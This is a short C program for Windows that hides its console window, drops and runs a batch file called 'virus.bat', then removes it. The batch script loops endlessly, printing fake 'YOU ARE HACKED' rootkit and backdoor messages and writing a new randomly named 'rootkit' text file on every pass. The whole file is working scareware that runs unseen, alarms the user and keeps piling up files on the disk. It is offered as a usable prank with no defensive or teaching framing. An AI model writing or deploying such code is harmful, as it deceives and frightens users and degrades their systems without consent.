#include <stdio.h>
#include <windows.h>
#define PATH "virus.bat"

int main(int argc, char* argv[])
{
    HWND window;
    AllocConsole();
    window = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(window, 0);

    FILE *a = fopen("virus.bat", "ab+");
    fclose(a);

    FILE *fp;

    fp = fopen(PATH, "w");
    fprintf(fp, "echo off\n:start\necho ==   YOU ARE HACKED   ==\necho INJECTC \%%random\%%/SYS/ROOT . . . DONE\necho MOVEC \%%random\%%/SYS/ROOT->SYS/WIN32 . . . DONE\necho BACKD \%%random\%%/SYS/ROOT->36.162.91.30 . . . DONE\necho ENCRYPTD \%%random\%%/SYS/ROOT . . . DONE\necho STORED \%%random\%%/SYS/ROOT . . . DONE\necho . . . COMPLETED INJECTION OF ROOTKIT>rootkit\%%random\%%.txt\ngoto start");

    fclose(fp);

    system(PATH);
    Sleep(10);
    remove(PATH);
    return 0;
}
